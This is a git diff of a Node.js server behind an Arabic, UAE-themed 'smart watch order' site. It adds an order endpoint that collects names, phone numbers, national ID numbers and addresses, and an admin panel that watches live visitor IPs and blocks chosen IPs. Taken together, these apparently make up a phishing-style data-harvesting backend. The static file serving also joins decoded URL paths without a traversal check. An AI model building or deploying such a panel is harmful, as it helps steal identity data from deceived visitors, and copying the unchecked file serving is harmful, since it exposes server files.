@@ -8,99 +8,233 @@ const PORT = process.env.PORT || 8080;
 
 const ADMIN_HASH = '7c4ef8b7e0b8b6a8e776f5161acc3a323673a7f13edca8386aeb74137214b671';
 const adminTokens = new Set();
+const visitors = {};
+const orders = [];
+const blockedIPs = new Set();
+let orderCounter = 1000;
+let totalVisitsToday = 0;
+let pageViewsToday = 0;
+let todayDate = new Date().toDateString();
 
 function sha256(str) {
   return crypto.createHash('sha256').update(str).digest('hex');
 }
 
-const MIME = {
-  '.html': 'text/html; charset=utf-8',
-  '.css': 'text/css',
-  '.js': 'application/javascript',
-  '.png': 'image/png',
-  '.jpg': 'image/jpeg',
-  '.jpeg': 'image/jpeg',
-  '.gif': 'image/gif',
-  '.svg': 'image/svg+xml',
-  '.woff': 'font/woff',
-  '.woff2': 'font/woff2',
-  '.ttf': 'font/ttf',
-  '.ico': 'image/x-icon',
-  '.json': 'application/json',
-  '.xml': 'application/xml',
-  '.php': 'text/html; charset=utf-8',
-};
+function getIP(req) {
+  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '0.0.0.0';
+}
 
-const server = http.createServer((req, res) => {
-  let reqPath = decodeURIComponent(req.url.split('?')[0]);
+function getCookies(req) {
+  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
+    const [k, v] = c.trim().split('=');
+    if (k) acc[k] = v;
+    return acc;
+  }, {});
+}
 
-  if (req.method === 'POST' && reqPath === '/admin/login') {
-    let body = '';
-    req.on('data', c => body += c);
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        const hash = sha256(data.password || '');
-        if (hash === ADMIN_HASH) {
-          const token = crypto.randomBytes(32).toString('hex');
-          adminTokens.add(token);
-          res.writeHead(200, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: true, token: token }));
-        } else {
-          res.writeHead(401, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: false, message: 'كلمة المرور غير صحيحة' }));
-        }
-      } catch (e) {
-        res.writeHead(400, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, message: 'خطأ في الطلب' }));
-      }
-    });
-    return;
+function isAdmin(req) {
+  const cookies = getCookies(req);
+  return cookies.admin_token && adminTokens.has(cookies.admin_token);
+}
+
+function trackVisitor(req) {
+  const ip = getIP(req);
+  const ua = req.headers['user-agent'] || '';
+  const reqPath = decodeURIComponent(req.url.split('?')[0]);
+
+  if (reqPath.startsWith('/api/') || reqPath.startsWith('/admin')) return;
+
+  const now = Date.now();
+  const today = new Date().toDateString();
+  if (today !== todayDate) {
+    todayDate = today;
+    totalVisitsToday = 0;
+    pageViewsToday = 0;
   }
 
+  pageViewsToday++;
+
+  if (!visitors[ip]) {
+    totalVisitsToday++;
+    visitors[ip] = { ip, ua, page: reqPath, time: now, start: now };
+  } else {
+    visitors[ip].page = reqPath;
+    visitors[ip].time = now;
+    visitors[ip].ua = ua;
+  }
+}
+
+function getActiveVisitors() {
+  const cutoff = Date.now() - 60000;
+  const active = [];
+  for (const ip in visitors) {
+    if (visitors[ip].time > cutoff) {
+      active.push(visitors[ip]);
+    } else {
+      delete visitors[ip];
+    }
+  }
+  return active;
+}
+
+function readBody(req) {
+  return new Promise((resolve) => {
+    let body = '';
+    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
+    req.on('end', () => resolve(body));
+  });
+}
+
+function json(res, data, status) {
+  res.writeHead(status || 200, { 'Content-Type': 'application/json' });
+  res.end(JSON.stringify(data));
+}
+
+const MIME = {
+  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
+  '.js': 'application/javascript', '.png': 'image/png',
+  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
+  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
+  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
+  '.xml': 'application/xml', '.php': 'text/html; charset=utf-8',
+};
+
+const server = http.createServer(async (req, res) => {
+  const reqPath = decodeURIComponent(req.url.split('?')[0]);
+
+  trackVisitor(req);
+
+  // --- API Routes ---
+
+  if (req.method === 'POST' && reqPath === '/admin/login') {
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      if (sha256(data.password || '') === ADMIN_HASH) {
+        const token = crypto.randomBytes(32).toString('hex');
+        adminTokens.add(token);
+        return json(res, { success: true, token });
+      }
+      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
+    } catch (e) {
+      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
+    }
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/orders') {
+    const ip = getIP(req);
+    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      orderCounter++;
+      const order = {
+        id: orderCounter,
+        name: (data.name || '').substring(0, 100),
+        phone: (data.phone || '').substring(0, 20),
+        id_number: (data.id_number || '').substring(0, 50),
+        email: (data.email || '').substring(0, 100),
+        emirate: (data.emirate || '').substring(0, 50),
+        address: (data.address || '').substring(0, 200),
+        country: (data.country || 'الإمارات').substring(0, 50),
+        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
+        lang: data.lang || 'ar',
+        ip: ip,
+        status: 'pending',
+        date: new Date().toISOString()
+      };
+      orders.push(order);
+      return json(res, { success: true, id: order.id });
+    } catch (e) {
+      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
+    }
+  }
+
+  if (req.method === 'GET' && reqPath === '/api/stats') {
+    const active = getActiveVisitors();
+    return json(res, {
+      activeVisitors: active.length,
+      totalVisitsToday,
+      pageViewsToday,
+      totalOrders: orders.length,
+      pendingOrders: orders.filter(o => o.status === 'pending').length
+    });
+  }
+
+  if (req.method === 'GET' && reqPath === '/api/orders') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    return json(res, { orders: orders.slice().reverse() });
+  }
+
+  if (req.method === 'GET' && reqPath === '/api/visitors') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const active = getActiveVisitors();
+    return json(res, { visitors: active, count: active.length });
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/orders/status') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const order = orders.find(o => o.id === data.id);
+      if (!order) return json(res, { error: 'not found' }, 404);
+      order.status = data.status;
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/block-ip') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      blockedIPs.add(data.ip);
+      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  // --- Admin Auth ---
+
   if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
-    const cookies = (req.headers.cookie || '').split(';').reduce((acc, c) => {
-      const [k, v] = c.trim().split('=');
-      if (k) acc[k] = v;
-      return acc;
-    }, {});
-    if (!cookies.admin_token || !adminTokens.has(cookies.admin_token)) {
+    if (!isAdmin(req)) {
       const loginPage = path.join(ROOT, 'admin', 'login.html');
       if (fs.existsSync(loginPage)) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-        fs.createReadStream(loginPage).pipe(res);
-        return;
+        return fs.createReadStream(loginPage).pipe(res);
       }
     }
   }
 
-  if (!reqPath.endsWith('/') && !path.extname(reqPath)) {
-    const dirPath = path.join(ROOT, reqPath);
+  // --- Static Files ---
+
+  let filePath = reqPath;
+  if (!filePath.endsWith('/') && !path.extname(filePath)) {
+    const dirPath = path.join(ROOT, filePath);
     if (fs.existsSync(dirPath) && fs.statSync(dirPath).isDirectory()) {
-      res.writeHead(301, { 'Location': reqPath + '/' });
+      res.writeHead(301, { 'Location': filePath + '/' });
       return res.end();
     }
   }
+  if (filePath.endsWith('/')) filePath += 'index.html';
 
-  if (reqPath.endsWith('/')) reqPath += 'index.html';
-
-  const filePath = path.join(ROOT, reqPath);
-
-  if (!fs.existsSync(filePath)) {
+  const fullPath = path.join(ROOT, filePath);
+  if (!fs.existsSync(fullPath)) {
     res.writeHead(404, { 'Content-Type': 'text/plain' });
-    return res.end('Not found: ' + reqPath);
+    return res.end('Not found: ' + filePath);
   }
 
-  const ext = path.extname(filePath).toLowerCase();
-  const contentType = MIME[ext] || 'application/octet-stream';
-
-  res.writeHead(200, { 'Content-Type': contentType });
-  fs.createReadStream(filePath).pipe(res);
+  const ext = path.extname(fullPath).toLowerCase();
+  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
+  fs.createReadStream(fullPath).pipe(res);
 });
 
 server.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
-  console.log(`Arabic:  http://localhost:${PORT}/ar/`);
-  console.log(`English: http://localhost:${PORT}/en/`);
   console.log(`Admin:   http://localhost:${PORT}/admin/`);
 });
